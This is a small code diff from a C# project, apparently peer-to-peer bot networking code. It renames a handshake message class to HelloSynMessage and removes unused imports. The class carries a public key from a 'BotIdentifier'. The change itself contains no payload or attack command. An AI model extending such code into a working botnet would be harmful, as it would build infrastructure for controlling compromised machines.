@@ -1,17 +1,12 @@
-using System;
-using System.Diagnostics;
 using System.IO;
-using System.Security.Cryptography;
-using System.Text;
-using Vinchuca.Crypto;
 
 namespace Vinchuca.Network.Protocol.Messages.System
 {
-    public class HelloMessage : Message
+    public class HelloSynMessage : Message
     {
         public byte[] PublicKey { get; set; }
 
-        public HelloMessage()
+        public HelloSynMessage()
         {
             PublicKey = BotIdentifier.PublicKey;
         }
